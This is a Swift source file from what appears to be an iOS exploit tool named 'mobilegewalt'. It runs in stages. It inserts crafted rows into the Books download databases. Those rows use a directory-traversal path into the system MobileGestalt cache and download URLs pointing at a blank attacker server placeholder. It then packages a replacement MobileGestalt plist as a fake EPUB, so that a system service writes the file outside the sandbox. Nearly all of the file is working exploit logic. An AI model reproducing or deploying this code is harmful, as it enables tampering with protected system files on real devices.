//
//  kraft.swift
//  mobilegewalt
//
//  Created by ruter on 18.11.25.
//

import SQLite3
import UIKit
import Combine
import Foundation
import ZIPFoundation
import UniformTypeIdentifiers

class StageModel: ObservableObject {
    @Published var onedone: Bool = false
    @Published var twodone: Bool = false
    @Published var threedone: Bool = false
    @Published var text: String = "Stage 1"
}

let stagestatus = StageModel()
let booksuuid = "68A0EEF9-206E-4ADF-A10C-E2D1BB689B5D"
let server = ""
let path = "../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library"

func kraftdl28() {
    guard let dburl = Bundle.main.url(forResource: "downloads.28", withExtension: "sqlitedb") else {
        globallogger.log("[ - ] could not find downloads.28.sqlitedb in bundle")
        return
    }

    let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    let writeabledb = docs.appendingPathComponent("downloads.28.sqlitedb")

    globallogger.log("[ + ] copying db!")
    do {
        if FileManager.default.fileExists(atPath: writeabledb.path) {
            try FileManager.default.removeItem(at: writeabledb)
        }
        try FileManager.default.copyItem(at: dburl, to: writeabledb)
        globallogger.log("[ i ] copied db!")
    } catch {
        globallogger.log("[ - ] failed to copy db: \(error)")
        return
    }

    var db: OpaquePointer?

    globallogger.log("[ + ] opening db")
    if sqlite3_open(writeabledb.path, &db) == SQLITE_OK {
        globallogger.log("[ i ] opened db!")
        let pid = Int64.random(in: 1_000_000_000...9_223_372_036_854_775_807)

        let sql = """
        INSERT INTO "main"."asset" ("pid", "download_id", "asset_order", "asset_type", "bytes_total", "url", "local_path", "destination_url", "path_extension", "retry_count", "http_method", "initial_odr_size", "is_discretionary", "is_downloaded", "is_drm_free", "is_external", "is_hls", "is_local_cache_server", "is_zip_streamable", "processing_types", "video_dimensions", "timeout_interval", "store_flavor", "download_token", "blocked_reason", "avfoundation_blocked", "service_type", "protection_type", "store_download_key", "etag", "bytes_to_hash", "hash_type", "server_guid", "file_protection", "variant_id", "hash_array", "http_headers", "request_parameters", "body_data", "body_data_file_path", "sinfs_data", "dpinfo_data", "uncompressed_size", "url_session_task_id") VALUES (\(pid), 6936249076851270150, 0, 'media', NULL, '\(server)/BLDatabaseManager.sqlite', '/private/var/containers/Shared/SystemGroup/\(booksuuid)/Documents/BLDatabaseManager/BLDatabaseManager.sqlite', NULL, 'epub', 6, 'GET', NULL, 0, 0, 0, 1, 0, 0, 0, 0, NULL, 60, NULL, 466440000, 0, 0, 0, 0, '', NULL, NULL, 0, NULL, NULL, NULL, X'62706c6973743030a1015f10203661383338316461303164646263393339653733643131303036326266633566080a000000000000010100000000000000020000000000000000000000000000002d', NULL, NULL, NULL, NULL, NULL, NULL, 0, 1);
        """

        if sqlite3_exec(db, sql, nil, nil, nil) != SQLITE_OK {
            let errmsg = String(cString: sqlite3_errmsg(db)!) // might crash idrc
            globallogger.log("[ - ] insert failed: \(errmsg)")
        } else {
            globallogger.log("[ i ] insert successful!")
            stagestatus.onedone = true
            stagestatus.text = "Stage 2"
        }

        sqlite3_close(db)
    } else {
        globallogger.log("[ - ] failed to open db")
    }
}


func kraftBLDMgr() {
    guard let dburl = Bundle.main.url(forResource: "BLDatabaseManager", withExtension: "sqlite") else {
        globallogger.log("[ - ] could not find BLDatabaseManager.sqlite in bundle")
        return
    }

    let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    let writeabledb = docs.appendingPathComponent("BLDatabaseManager.sqlite")

    globallogger.log("[ + ] copying db!")
    do {
        if FileManager.default.fileExists(atPath: writeabledb.path) {
            try FileManager.default.removeItem(at: writeabledb)
        }
        try FileManager.default.copyItem(at: dburl, to: writeabledb)
        globallogger.log("[ i ] copied db!")
    } catch {
        globallogger.log("[ - ] failed to copy db: \(error)")
        return
    }

    var db: OpaquePointer?

    globallogger.log("[ + ] opening db")
    if sqlite3_open(writeabledb.path, &db) == SQLITE_OK {
        globallogger.log("[ i ] opened db!")

        let sql = """
        INSERT INTO "ZBLDOWNLOADINFO" ("Z_PK", "Z_ENT", "Z_OPT", "ZACCOUNTIDENTIFIER", "ZCLEANUPPENDING", "ZFAMILYACCOUNTIDENTIFIER", "ZISAUTOMATICDOWNLOAD", "ZISLOCALCACHESERVER", "ZISPURCHASE", "ZISRESTORE", "ZISSAMPLE", "ZISZIPSTREAMABLE", "ZNUMBEROFBYTESTOHASH", "ZPERSISTENTIDENTIFIER", "ZPUBLICATIONVERSION", "ZSERVERNUMBEROFBYTESTOHASH", "ZSIZE", "ZSTATE", "ZSTOREIDENTIFIER", "ZSTOREPLAYLISTIDENTIFIER", "ZLASTSTATECHANGETIME", "ZPURCHASEDATE", "ZSTARTTIME", "ZARTISTNAME", "ZARTWORKPATH", "ZASSETPATH", "ZBUYPARAMETERS", "ZCANCELDOWNLOADURL", "ZCLIENTIDENTIFIER", "ZCOLLECTIONARTISTNAME", "ZCOLLECTIONTITLE", "ZDOWNLOADID", "ZDOWNLOADKEY", "ZENCRYPTIONKEY", "ZEPUBRIGHTSPATH", "ZFILEEXTENSION", "ZGENRE", "ZHASHTYPE", "ZKIND", "ZMD5HASHSTRINGS", "ZORIGINALURL", "ZPERMLINK", "ZPLISTPATH", "ZSALT", "ZSUBTITLE", "ZTHUMBNAILIMAGEURL", "ZTITLE", "ZTRANSACTIONIDENTIFIER", "ZURL", "ZRACGUID", "ZDPINFO", "ZSINFDATA", "ZFILEATTRIBUTES") VALUES
        ('1', '2', '3', '0', '0', '0', '0', '', NULL, NULL, NULL, NULL, '0', '0', '0', NULL, '4648', '2', '765107108', NULL, '767991550.119197', NULL, '767991353.245275', NULL, NULL, '/private/var/mobile/Media/Books/asset.epub', 'productType=PUB&price=0&salableAdamId=765107106&pricingParameters=PLUS&pg=default&mtApp=com.apple.iBooks&mtEventTime=1746298553233&mtOsVersion=18.4.1&mtPageId=SearchIncrementalTopResults&mtPageType=Search&mtPageContext=search&mtTopic=xp_amp_bookstore&mtRequestId=35276ff6-5c8b-4136-894e-b6d8fc7677b3', 'https://p19-buy.itunes.apple.com/WebObjects/MZFastFinance.woa/wa/songDownloadDone?download-id=J19N_PUB_190099164604738&cancel=1', '4GG2695MJK.com.apple.iBooks', 'Sebastian Saenz', 'Cartas de Amor a la Luna', '\(path)', NULL, NULL, NULL, NULL, 'Contemporary Romance', NULL, 'ebook', NULL, NULL, NULL, '/private/var/mobile/Media/Books/iTunesMetadata.plist', NULL, 'Cartas de Amor a la Luna', '\(server)/com.apple.MobileGestalt.plist', 'Cartas de Amor a la Luna', 'J19N_PUB_190099164604738', 'https://<url_domain_here>/fileprovider.php?type=gestalt2', NULL, NULL, NULL, NULL);
        """

        if sqlite3_exec(db, sql, nil, nil, nil) != SQLITE_OK {
            let errmsg = String(cString: sqlite3_errmsg(db)!)
            globallogger.log("[ - ] insert failed: \(errmsg)")
            stagestatus.twodone = true
            stagestatus.text = "Stage 3"
        } else {
            globallogger.log("[ i ] insert successful!")
            stagestatus.twodone = true
            stagestatus.text = "Stage 3"
        }

        sqlite3_close(db)
    } else {
        globallogger.log("[ - ] failed to open db")
    }
}

func kraftepub(from viewController: UIViewController) {
    let fileManager = FileManager.default
    let writableCaches = fileManager.urls(for: .cachesDirectory, in: .userDomainMask).first!
    
    let tempFolder = writableCaches.appendingPathComponent("epub_temp")
    do {
        if fileManager.fileExists(atPath: tempFolder.path) {
            try fileManager.removeItem(at: tempFolder)
            globallogger.log("[ i ] removed old temp folder")
        }
        try fileManager.createDirectory(at: tempFolder, withIntermediateDirectories: true)
        globallogger.log("[ i ] created temp folder")
    } catch {
        globallogger.log("[ - ] failed to prepare temp folder: \(error)")
        return
    }

    guard let plistURL = Bundle.main.url(forResource: "com.apple.MobileGestalt", withExtension: "plist") else {
        globallogger.log("[ - ] could not find plist in bundle")
        return
    }
    let destPlist = tempFolder.appendingPathComponent("com.apple.MobileGestalt.plist")
    do {
        try fileManager.copyItem(at: plistURL, to: destPlist)
        globallogger.log("[ i ] copied plist to temp folder")
    } catch {
        globallogger.log("[ - ] failed to copy plist: \(error)")
        return
    }

    guard let mimetypeURL = Bundle.main.url(forResource: "mimetype", withExtension: nil) else {
        globallogger.log("[ - ] mimetype file missing in bundle")
        return
    }
    let destMimetype = tempFolder.appendingPathComponent("mimetype")
    do {
        try fileManager.copyItem(at: mimetypeURL, to: destMimetype)
        globallogger.log("[ i ] copied mimetype to temp folder")
    } catch {
        globallogger.log("[ - ] failed to copy mimetype: \(error)")
        return
    }

    let epubURL = writableCaches.appendingPathComponent("mobilegewalt.epub")
    if fileManager.fileExists(atPath: epubURL.path) {
        do {
            try fileManager.removeItem(at: epubURL)
            globallogger.log("[ i ] removed old EPUB")
        } catch {
            globallogger.log("[ - ] failed to remove old EPUB: \(error)")
            return
        }
    }

    do {
        try fileManager.zipItem(at: tempFolder, to: epubURL)
        globallogger.log("[ + ] EPUB created at: \(epubURL.path)")
        
    } catch {
        globallogger.log("[ - ] error creating EPUB: \(error)")
        return
    }

    do {
        try fileManager.removeItem(at: tempFolder)
        globallogger.log("[ i ] cleaned up temp folder")
    } catch {
        globallogger.log("[ - ] failed to clean temp folder: \(error)")
    }

    let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.epub])
    viewController.present(picker, animated: true)
}
